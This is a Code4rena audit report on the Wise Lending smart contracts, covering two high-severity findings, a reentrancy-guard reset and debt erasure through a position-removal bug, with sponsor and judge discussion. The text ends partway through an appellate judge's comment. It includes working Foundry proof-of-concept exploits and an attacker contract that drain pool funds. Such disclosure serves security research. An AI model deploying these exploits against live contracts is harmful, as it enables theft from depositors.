---
sponsor: "Wise Lending"
slug: "2024-02-wise-lending"
date: "2024-05-03"
title: "Wise Lending"
findings: "https://github.com/code-423n4/2024-02-wise-lending-findings/issues"
contest: 330
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Wise Lending  smart contract system written in Solidity. The audit took place between February 21 — March 11, 2024.

## Wardens

37 Wardens contributed reports to Wise Lending:

  1. [nonseodion](https://code4rena.com/@nonseodion)
  2. [0xStalin](https://code4rena.com/@0xStalin)
  3. [Dup1337](https://code4rena.com/@Dup1337) ([sorrynotsorry](https://code4rena.com/@sorrynotsorry) and [deliriusz](https://code4rena.com/@deliriusz))
  4. [0xCiphky](https://code4rena.com/@0xCiphky)
  5. [serial-coder](https://code4rena.com/@serial-coder)
  6. [NentoR](https://code4rena.com/@NentoR)
  7. [Draiakoo](https://code4rena.com/@Draiakoo)
  8. [00xSEV](https://code4rena.com/@00xSEV)
  9. [t0x1c](https://code4rena.com/@t0x1c)
  10. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww) and [Blckhv](https://code4rena.com/@Blckhv))
  11. [Matin](https://code4rena.com/@Matin)
  12. [JCN](https://code4rena.com/@JCN)
  13. [aariiif](https://code4rena.com/@aariiif)
  14. [Myd](https://code4rena.com/@Myd)
  15. [WoolCentaur](https://code4rena.com/@WoolCentaur)
  16. [Jorgect](https://code4rena.com/@Jorgect)
  17. [AM](https://code4rena.com/@AM) ([StefanAndrei](https://code4rena.com/@StefanAndrei) and [0xmatei](https://code4rena.com/@0xmatei))
  18. [0x11singh99](https://code4rena.com/@0x11singh99)
  19. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  20. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  21. [0xAnah](https://code4rena.com/@0xAnah)
  22. [dharma09](https://code4rena.com/@dharma09)
  23. [K42](https://code4rena.com/@K42)
  24. [0xepley](https://code4rena.com/@0xepley)
  25. [fouzantanveer](https://code4rena.com/@fouzantanveer)
  26. [kaveyjoe](https://code4rena.com/@kaveyjoe)
  27. [foxb868](https://code4rena.com/@foxb868)
  28. [josephdara](https://code4rena.com/@josephdara)
  29. [unix515](https://code4rena.com/@unix515)
  30. [Mrxstrange](https://code4rena.com/@Mrxstrange)
  31. [shealtielanz](https://code4rena.com/@shealtielanz)
  32. [Rhaydden](https://code4rena.com/@Rhaydden)
  33. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  34. [albahaca](https://code4rena.com/@albahaca)

This audit was judged by [Trust](https://code4rena.com/@Trust).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 22 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 17 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 7 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 6 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Wise Lending repository](https://github.com/code-423n4/2024-02-wise-lending), and is composed of 44 smart contracts written in the Solidity programming language and includes 6326 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **znBotty** from warden Rolezn, generated the [Automated Findings report](https://github.com/code-423n4/2024-02-wise-lending/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (5)
## [[H-01] Exploitation of the receive Function to Steal Funds](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228)
*Submitted by [0xCiphky](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228), also found by [t0x1c](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40)*

The `WiseLending` contract incorporates a reentrancy guard through its [syncPool](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L97) modifier, specifically within the [`_syncPoolBeforeCodeExecution`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L275) function. This guard is meant to prevent reentrancy during external calls, such as in the [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L636) function, which processes ETH withdrawals for users.

However, there is currently a way to reset this guard, allowing for potential reentrant attacks during external calls. The `WiseLending` contract includes a [receive](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L49) function designed to automatically redirect all ETH sent directly to it (apart from transactions from the WETH address) to a specified master address.

To forward the ETH the [`_sendValue`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/SendValueHelper.sol#L12) function is used, here the `sendingProgress` variable (which is used for reentrancy checks) is set to true to denote the start of the transfer process and subsequently reset to false following the completion of the call.

```solidity
    function _sendValue(
        address _recipient,
        uint256 _amount
    )
        internal
    {
        if (address(this).balance < _amount) {
            revert AmountTooSmall();
        }

        sendingProgress = true;

        (
            bool success
            ,
        ) = payable(_recipient).call{
            value: _amount
        }("");

        sendingProgress = false;

        if (success == false) {
            revert SendValueFailed();
        }
    }
```

As a result, an attacker could bypass an active reentrancy guard by initiating the receive function, effectively resetting the `sendingProgress` variable. This action clears the way for an attacker to re-enter any function within the contract, even those protected by the reentrancy guard.

Having bypassed the reentrancy protection, let's see how this vulnerability could be leveraged to steal funds from the contract.

The [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) function allows users to withdraw their deposited shares from the protocol and receive ETH, this function also contains a [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) to ensure post withdrawal a users position is still in a healthy state. Note that this health check is done after the external call that pays out the user ETH, this will be important later on.

The protocol also implements a [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function that allows users to pay off any other users bad debt and receive a 5% incentive for doing so.

To understand how this can be exploited, consider the following example:

- User A deposits 1 ETH into the protocol.
- User A borrows 0.5 ETH.
- User A calls  [`withdrawExactAmountETH`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L675) to withdraw 1 ETH.
    - User A reenters the contract through the external call.
        - User A resets the reentrancy guard with a direct transfer of 0.001 ETH to the `WiseLending` contract.
        - Next, User A calls the [`paybackBadDebtForToken`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L730) function to settle their own 0.5 ETH loan, which, due to the withdrawal, is now classified as bad debt. This not only clears the debt but also secures 0.5 ETH plus an additional incentive for User A.
    - With the bad debt cleared, the [`healthStateCheck`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L681) within the withdrawal function is successfully passed.
- Consequently, User A manages to retrieve their initial 1 ETH deposit and gain an additional 0.5 ETH (plus the incentive for paying off bad debt).

### Proof Of Concept

Testing is done in the `WiseLendingShutdownTest` file, with `ContractA` imported prior to executing tests:

```solidity
// import ContractA
import "./ContractA.sol";
// import MockErc20
import "./MockContracts/MockErc20.sol";

contract WiseLendingShutdownTest is Test {
    ...
    ContractA public contractA;

    function _deployNewWiseLending(bool _mainnetFork) internal {
        ...
        contractA = new ContractA(address(FEE_MANAGER_INSTANCE), payable(address(LENDING_INSTANCE)));
        ...
    }
```

```solidity
    function testExploitReentrancy() public {
        uint256 depositValue = 10 ether;
        uint256 borrowAmount = 2 ether;
        vm.deal(address(contractA), 2 ether);

        ORACLE_HUB_INSTANCE.setHeartBeat(WETH_ADDRESS, 100 days);

        POSITION_NFTS_INSTANCE.mintPosition();

        uint256 nftId = POSITION_NFTS_INSTANCE.tokenOfOwnerByIndex(address(this), 0);

        LENDING_INSTANCE.depositExactAmountETH{value: depositValue}(nftId);
        LENDING_INSTANCE.borrowExactAmountETH(nftId, borrowAmount);

        vm.prank(address(LENDING_INSTANCE));
        MockErc20(WETH_ADDRESS).transfer(address(FEE_MANAGER_INSTANCE), 1 ether);

        // check contractA balance
        uint ethBalanceStart = address(contractA).balance;
        uint wethBalanceStart = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
        //total
        uint totalBalanceStart = ethBalanceStart + wethBalanceStart;
        console.log("totalBalanceStart", totalBalanceStart);

        // deposit using contractA
        vm.startPrank(address(contractA));
        LENDING_INSTANCE.depositExactAmountETHMint{value: 2 ether}();
        vm.stopPrank();

       FEE_MANAGER_INSTANCE._increaseFeeTokens(WETH_ADDRESS, 1 ether);
        
        // withdraw weth using contractA
        vm.startPrank(address(contractA));
        LENDING_INSTANCE.withdrawExactAmount(2, WETH_ADDRESS, 1 ether);
        vm.stopPrank();

        // approve feemanager for 1 weth from contractA
        vm.startPrank(address(contractA));
        MockErc20(WETH_ADDRESS).approve(address(FEE_MANAGER_INSTANCE), 1 ether);
        vm.stopPrank();

        // borrow using contractA
        vm.startPrank(address(contractA));
        LENDING_INSTANCE.borrowExactAmount(2,  WETH_ADDRESS, 0.5 ether);
        vm.stopPrank();

        // Payback amount
        //499537556593483218

        // withdraw using contractA
        vm.startPrank(address(contractA));
        LENDING_INSTANCE.withdrawExactAmountETH(2, 0.99 ether);
        vm.stopPrank();

        // check contractA balance
        uint ethBalanceAfter = address(contractA).balance;
        uint wethBalanceAfter = MockErc20(WETH_ADDRESS).balanceOf(address(contractA));
        //total
        uint totalBalanceAfter = ethBalanceAfter + wethBalanceAfter;
        console.log("totalBalanceAfter", totalBalanceAfter);
        uint diff = totalBalanceAfter - totalBalanceStart;
        assertEq(diff > 5e17, true, "ContractA profit greater than 0.5 eth");
    }
```

```solidity
// SPDX-License-Identifier: -- WISE --

pragma solidity =0.8.24;

// import lending and fees contracts
import "./WiseLending.sol";
import "./FeeManager/FeeManager.sol";

contract ContractA {
    address public feesContract;
    address payable public lendingContract;

    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(address _feesContract, address payable _lendingContract) payable {
        feesContract = _feesContract;
        lendingContract = _lendingContract;
    }

    fallback() external payable {
        if (msg.sender == lendingContract) {
            // send lending contract 0.01 eth to reset reentrancy flag
            (bool sent, bytes memory data) = lendingContract.call{value: 0.01 ether}("");
            //paybackBadDebtForToken
            FeeManager(feesContract).paybackBadDebtForToken(2, WETH_ADDRESS, WETH_ADDRESS, 499537556593483218);
        }
    }
}
```

### Impact

This vulnerability allows an attacker to illicitly withdraw funds from the contract through the outlined method. Additionally, the exploit could also work using the contract's liquidation process instead.

### Tools Used

Foundry

### Recommendation

Edit the `_sendValue` function to include a reentrancy check. This ensures that the reentrancy guard is first checked, preventing attackers from exploiting this function as a reentry point. This will also not disrupt transfers from the WETH address as those don’t go through the `_sendValue` function.

```solidity
    function _sendValue(
        address _recipient,
        uint256 _amount
    )
        internal
    {
        if (address(this).balance < _amount) {
            revert AmountTooSmall();
        }

	_checkReentrancy(); //add here

        sendingProgress = true;

        (
            bool success
            ,
        ) = payable(_recipient).call{
            value: _amount
        }("");

        sendingProgress = false;

        if (success == false) {
            revert SendValueFailed();
        }
    }
```

**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009575546):**
> Good catch but we don't consider it a high since no `userFunds` relevant state variables are changed after sending the value. And since such a call would encapsulate the `borrowrate` check at the end, everything works as planned and it cannot be used to block funds or extract value or drain funds or anything. Still good to add a reentrancy check to receive function just in case.
>
> UPDATE EDIT: Ok, you also submitted a stealing of funds POC we will take a look.

**[vonMangoldt (Wise Lending) commented via duplicate issue #40](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/40#issuecomment-2009953330):**
> Seems like this doesn't endanger users. A user is able to borrow beyond his allowed limit. It's basically just a flashloan without permission?

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/228#issuecomment-2082885051):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[H-02] User can erase their position debt for free](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215)
*Submitted by [Dup1337](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215)*

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866>

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727>

### Vulnerability details

When the pool token stops being used in the position, the `_removePositionData` function is called. However, it assumes that `poolToken` that is passed as a parameter always exists in user token array, which is not always the case. In the case of function `FeeManager.paybackBadDebtNoReward()`, which indirectly calls `_removePositionData`, insufficient validation doesn't check if repay token is in user array, which results in zeroing out information about user debt.

### Impact

Free elimination of user debt.

### Proof of Concept

First, let's see how `MainHelper._removePositionData()` works:

```javascript
    function _removePositionData(
        uint256 _nftId,
        address _poolToken,
        function(uint256) view returns (uint256) _getPositionTokenLength,
        function(uint256, uint256) view returns (address) _getPositionTokenByIndex,
        function(uint256, address) internal _deleteLastPositionData,
        bool isLending
    )
        private
    {
        uint256 length = _getPositionTokenLength(
            _nftId
        );

        if (length == 1) {
            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            return;
        }

        uint8 i;
        uint256 endPosition = length - 1;

        while (i < length) {

            if (i == endPosition) {
                _deleteLastPositionData(
                    _nftId,
                    _poolToken
                );

                break;
            }

            if (_getPositionTokenByIndex(_nftId, i) != _poolToken) {
                unchecked {
                    ++i;
                }
                continue;
            }

            address poolToken = _getPositionTokenByIndex(
                _nftId,
                endPosition
            );

            isLending == true
                ? positionLendTokenData[_nftId][i] = poolToken
                : positionBorrowTokenData[_nftId][i] = poolToken;

            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            break;
        }
    }
```

So, `_poolToken` sent in parameter is not checked if:

1. The position consists of only one token. Then the token is removed, no matter if it's `_poolToken` or not.
2. No token was found during the position token iteration. In which case, the last token is removed, no matter if it's `_poolToken` or not.

This function is called in `MainHelper._corePayback()`, which in turn is called in `FeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback()`. The important factor is that `paybackBadDebtNoReward()` doesn't check if position utilizes  `_paybackToken` passed by the caller and allows it to pass any token. The only prerequisite is that `badDebtPosition[_nftId]` has to be bigger than `0`:

```javascript
    function paybackBadDebtNoReward(
        uint256 _nftId,
        address _paybackToken,
        uint256 _shares
    )
        external
        returns (uint256 paybackAmount)
    {
        updatePositionCurrentBadDebt(
            _nftId
        );

        if (badDebtPosition[_nftId] == 0) {
            return 0;
        }

        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {
            revert PoolNotActive();
        }

        paybackAmount = WISE_LENDING.paybackAmount(
            _paybackToken,
            _shares
        );

        WISE_LENDING.corePaybackFeeManager(
            _paybackToken,
            _nftId,
            paybackAmount,
            _shares
        );

        _updateUserBadDebt(
            _nftId
        );
		// [...]
```

With these pieces of information, we can form following attack path:

1. Prepare a big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.
2. Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done, for example, before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.
3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.
4. Because there is non-zero bad debt, the check will pass, and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:

```javascript
    function _corePayback(
        uint256 _nftId,
        address _poolToken,
        uint256 _amount,
        uint256 _shares
    )
        internal
    {
        _updatePoolStorage(
            _poolToken,
            _amount,
            _shares,
            _increaseTotalPool,
            _decreasePseudoTotalBorrowAmount,
            _decreaseTotalBorrowShares
        );

        _decreasePositionMappingValue(
            userBorrowShares,
            _nftId,
            _poolToken,
            _shares
        );

        if (userBorrowShares[_nftId][_poolToken] > 0) {
            return;
        }

        _removePositionData({
            _nftId: _nftId,
            _poolToken: _poolToken,
            _getPositionTokenLength: getPositionBorrowTokenLength,
            _getPositionTokenByIndex: getPositionBorrowTokenByIndex,
            _deleteLastPositionData: _deleteLastPositionBorrowData,
            isLending: false
        });
```

5. Inside `_removePositionData`, because position length is 1, no checks to confirm if the token address matches will be performed:

```javascript
        uint256 length = _getPositionTokenLength(
            _nftId
        );

        if (length == 1) {
            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            return;
        }
```

6. This means that all information about user borrows are deleted. Meaning, that now system thinks the user has `$1M` collateral, and no debt. Which means that the attacker just stole the entire borrowed amount.

### Recommended Mitigation Steps

Add verification if the token that is passed to `_removePositionData()` exists in user tokens. If not, revert the transaction.

### Assessed type

Invalid Validation

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270):**
 > Double checking line of reasoning fails when user deposits large amount and then borrows.
> 
>> 1. Prepare big position that will have be destined to have positive `badDebt`. For sake of the argument, let's assume it's `$1M` worth of ETH.
>> 2. Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zero `badDebt`. This can be done for example before significant price update transaction from Chainlink. Then take `$1M` worth of ETH flashloan and put this as collateral to position, borrowing as much as possible.
>> 3. Call `FeeManager.paybackBadDebtNoReward()` on the position with desired position `nftId`, USDC token address and `0` shares as input params.
>> 4. Because there is non-zero bad debt, the check will pass, and and the logic will finally reach `MainHelper._corePayback()`. Because repay is `0` shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:
> 
> Comment:
> 1. Ok say big position has `nftId` = 1.
> 2. Ok say small position has `nftId` = 2.
>
> `nftId` 2 now takes more collateral and borrows max:
> then calls `paybackBadDebtNoReward` with `nftId` 2.
> 
> But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),
>
> This line here:
>
> ```
> updatePositionCurrentBadDebt(
>             _nftId
>         );
> ```
>
> in the beginning will set `badDebtPosition[_nft]` to `0` meaning it will exit after this line:
>
> ```
> if (badDebtPosition[_nftId] == 0) {
>     return 0;
>  }
>  ```
> 
> and no harm done.


**[deliriusz (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2026861525):**
 > @Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in `_removePositionData()`. I managed to not use very big position and a single token, which makes this issue even easier to perform.
> 
> PoC provided below does the following:
> 1. Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.
> 2. Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.
> 3. When bad debt repayment is triggered for a token that user didn't use, `_removePositionData()` removes last token in user borrow tokens. In this case that means that the user doesn't have any tokens in his debt tokens listed.
> 4. User borrows 95% of ALL ETH that the protocol holds. It's possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.
> 5. At the end I verified that the user really got the funds, which proves that the issue is real.
>
><details>
> 
> ```javascript
> // SPDX-License-Identifier: -- WISE --
> 
> pragma solidity =0.8.24;
> 
> import "./WiseLendingBaseDeployment.t.sol";
> 
> contract DebtClearTest is BaseDeploymentTest {
>     address borrower = address(uint160(uint(keccak256("alice"))));
>     address lender = address(uint160(uint(keccak256("bob"))));
>     address lender2 = address(uint160(uint(keccak256("bob2"))));
> 
>     uint256 depositAmountETH = 100 ether; // 10 ether
>     uint256 depositAmountToken = 10 ether; // 10 ether
>     uint256 borrowAmount = 5e18; // 5 ether
> 
>     uint256 nftIdLiquidator; // nftId of lender
>     uint256 nftIdLiquidatee; // nftId of borrower
> 
>     uint256 debtShares;
> 
>     function _setupIndividualTest() internal override {
>         _deployNewWiseLending(false);
> 
>         // set token value for simple calculations
>         MOCK_CHAINLINK_2.setValue(1 ether); // 1 token == 1 ETH
>         assertEq(MOCK_CHAINLINK_2.latestAnswer(), MOCK_CHAINLINK_ETH_ETH.latestAnswer());
>         vm.stopPrank();
>         
>         // fund lender and borrower
>         vm.deal(lender, depositAmountETH);
>         vm.deal(lender2, depositAmountETH);
>         deal(address(MOCK_WETH), lender, depositAmountETH);
>         deal(address(MOCK_ERC20_2), borrower, depositAmountToken * 2);
>         deal(address(MOCK_ERC20_1), lender, depositAmountToken * 2);
>     }
> 
>     function testRemovingToken() public {
>         IERC20 WETH = IERC20(LENDING_INSTANCE.WETH_ADDRESS());
>                 // lender supplies ETH
>         vm.startPrank(lender);
> 
>         nftIdLiquidator = POSITION_NFTS_INSTANCE.mintPosition();
> 
>         // deposit 100 ether into the pool
>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdLiquidator);
> 
>         vm.stopPrank();
> 
>         // prank second provider to make sure that the borrower is able to
>         // steal everyone's funds later
>         vm.startPrank(lender2);
> 
>         uint nftIdfundsProvider = POSITION_NFTS_INSTANCE.mintPosition();
> 
>         // deposit 100 ether into the pool
>         LENDING_INSTANCE.depositExactAmountETH{value: depositAmountETH}(nftIdfundsProvider);
> 
>         vm.stopPrank();
> 
>         // borrower supplies collateral token and borrows ETH
>         vm.startPrank(borrower);
> 
>         MOCK_ERC20_2.approve(address(LENDING_INSTANCE), depositAmountToken * 2);
> 
>         nftIdLiquidatee = POSITION_NFTS_INSTANCE.mintPosition();
>         
>         vm.warp(
>             block.timestamp + 10 days
>         );
> 
>         LENDING_INSTANCE.depositExactAmount( // supply collateral
>             nftIdLiquidatee, 
>             address(MOCK_ERC20_2), 
>             10
>         );
> 
>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH
> 
>         vm.stopPrank();
> 
>         // shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt
>         // second is maintaining small position that gives no incentive to liquidate it.
>         vm.prank(MOCK_DEPLOYER);
>         MOCK_CHAINLINK_2.setValue(0.3 ether);
> 
>         // borrower gets partially liquidated
>         vm.startPrank(lender);
> 
>         MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);
> 
>         LENDING_INSTANCE.liquidatePartiallyFromTokens(
>             nftIdLiquidatee,
>             nftIdLiquidator, 
>             address(MOCK_WETH),
>             address(MOCK_ERC20_2),
>             debtShares * 2e16 / 1e18 + 1 
>         );
> 
>         vm.stopPrank();
> 
>         // global and user bad debt is increased
>         uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
>         uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
> 
>         assertGt(totalBadDebt, 0); 
>         assertGt(userBadDebt, 0);
>         assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same
> 
>         vm.startPrank(lender);
> 
>         MOCK_ERC20_1.approve(address(LENDING_INSTANCE), type(uint256).max);
>         MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);
>         MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), type(uint256).max);
>         
>         // check how much tokens the position that will be liquidated has
>         uint256 lb = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
> 
>         assertEq(lb, 1);
> 
>         uint256 ethValueBefore = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
> 
>         console.log("ethBefore ", ethValueBefore);
> 
>         // **IMPORTANT** this is the core of the issue
>         // When bad debt occurs, there are 2 critical checks missing:
>         // 1. that the amount to repay is bigger than 0
>         // 2. that the token to repay bad debt has the bad debt for user
>         // This allows to remove any token from the list of user borrow tokens,
>         // because of how finding token to remove algorithm is implemented:
>         // it iterates over all the tokens and if it doesn't find matching one
>         // until it reaches last, it wrongly assumes that the last token is the
>         // one that should be removed.
>         // And not checking for amount of repayment allows to skip Solidity underflow 
>         // checks on diminishing user bad debt.
>         FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(
>             nftIdLiquidatee, 
>             address(MOCK_ERC20_1), // user doesn't have debt in this token
>             0
>         );
> 
>         uint256 ethValueAfter = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
>         uint256 ethWethValueAfter = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(WETH)
>         );
>         console.log("ethAfter ", ethValueAfter);
> 
>         // assert that the paybackBadDebtNoReward removed token that it shouldn't
>         uint256 la = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
>         assertEq(la, 0);
> 
>         vm.stopPrank();
>         
>         uint lendingWethBalance = WETH.balanceOf(address(LENDING_INSTANCE));
> 
>         console.log("lb ", lendingWethBalance);
>         console.log("bb ", borrower.balance);
> 
>         vm.startPrank(borrower);
> 
>         // borrow 95% of ALL ETH that the protocol possesses
>         // this works, because when calculating health check of a position
>         // it iterates through `getPositionBorrowTokenLength()` - and we
>         // were able to remove it.
>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, WETH.balanceOf(address(LENDING_INSTANCE)) * 95 / 100); // borrow ETH
> 
>         console.log("lb ", WETH.balanceOf(address(LENDING_INSTANCE)));
>         console.log("ba ", borrower.balance);
> 
>         // make sure that borrow tokens were not increased
>         uint256 la2 = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
>         assertEq(la2, 0);
> 
>         // verify that ~95% were taken from the pool and borrower received them
>         assertLt(WETH.balanceOf(address(LENDING_INSTANCE)), lendingWethBalance * 6 / 100);
>         assertGt(borrower.balance, lendingWethBalance * 94 / 100);
> 
>         uint256 ethValueAfter2 = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
>         console.log("ethAfter2 ", ethValueAfter2);
>         vm.stopPrank();
> 
>         // borrowing doesn't increase user borrow
>         assertEq(ethValueAfter, ethValueAfter2);
>     }
> }
> ```
> 
> </details>
>
> At the end of the test, it's verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027095241):**
 > Confirmed the test passes. 
 >
> ```
> [PASS] testRemovingToken() (gas: 2242360)
> Logs:
>   ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239
>   POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9
>   LATEST RESPONSE 1000000000000000000
>   ethBefore  300000000000000000
>   ethAfter  300000000000000000
>   lb  195100000000000000001
>   bb  5000000000000000000
>   lb  9755000000000000001
>   ba  190345000000000000000
>   ethAfter2  300000000000000000
> ```
> 
> The likelihood/impact are in line with high severity.
> A POC was not initially provided, but the step by step given is deemed sufficient.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027309902):**
 > @Foon256 or @vonMangoldt - can check this again I think. I'll check what kind of code change we need to add in order to prevent this scenario.

**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2029781697):**
 > The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don't know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2030208760):**
 > The warden's identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.

**[Alex the Entreprenerd (Appellate Court lead judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2056792265):**
 > ### Summary of the issue
 >
> Due to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.
> 
> ### Alex the Entreprenerd’s (Appellate Court lead judge) input
>
> Facts:
> 1. `paybackBadDebtNoReward` can be called with non existent `paybacktoken`.
> 2. First `poolToken` bad debt position will be deleted by default.
> 3. Remove position in the original submission is not fully clear, but is implicitly mentioning using `_deleteLastPositionBorrowDatafor` `_removePositionData`.
> 4. This will forgive the bad debt and break the system.
> 5. Was disputed due to this.
> 
> This asserts that the attack cannot be done atomically, that's true.
>
> 6. The original submission explains that, due to generating bad debt.
> 
> I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around "proper" vs "malicious" liquidators is not a major decision factor.
> 
